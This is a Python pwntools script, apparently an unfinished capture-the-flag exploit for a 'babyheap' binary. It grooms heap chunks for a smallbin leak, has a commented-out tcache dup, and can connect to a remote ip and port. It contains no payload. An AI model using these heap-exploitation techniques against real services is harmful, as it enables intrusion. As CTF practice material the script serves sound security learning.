#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
import sys
import os

r = None
#e = ELF('./babyheap')
#libc = ELF('./libc.so')

context.log_level = 'DEBUG'

def malloc(size, content='a'):
    r.sendline('M')
    r.recvuntil('>')
    r.sendline(str(len(content)))
    r.recvuntil('>')
    r.sendline(content)
    r.recvuntil('>')

def free(idx):
    r.sendline('F')
    r.recvuntil('>')
    r.sendline(str(idx))
    r.recvuntil('>')

def show(idx):
    r.sendline('S')
    r.recvuntil('>')
    r.sendline(str(idx))
    return r.recvuntil('>')

def main():
    global r
    # Get smallbin leak
    malloc(0x178) #smallbin size
    malloc(0x178)
    malloc(0x178)
    malloc(0x178)
    malloc(0x178)
    free(0)
    free(1)
    free(2)
    free(3)
    malloc(0xf8, cyclic(0xf8))
    malloc(0x178, cyclic(0x178))
    gdb.attach(r)

    # Get a tcache dup
    #malloc(0xf0) # fastbin size
    #malloc(0xf0)
    #malloc(0xf0)
    #malloc(0xf0)
    #free(0)
    #free(1)
    #malloc(0x100) #smallbin size <- forces tcache error to die
    #free(0)
    #malloc(0xf0)


    r.interactive()




if __name__ == "__main__":
    global r
    if len(sys.argv) == 1:
        #r = process('./babyheap', env = {'LD_LIBRARY_PATH': os.getcwd()})
        cwd = os.getcwd()
        r = process('./babyheap', env = {'LD_PRELOAD': cwd + '/ld-2.29.so ' + cwd + '/libc.so'})
    elif len(sys.argv) == 3:
        r = remote(sys.argv[1], int(sys.argv[2]))
    else:
        print "Usage: %s ip port" % sys.argv[0]

    main()

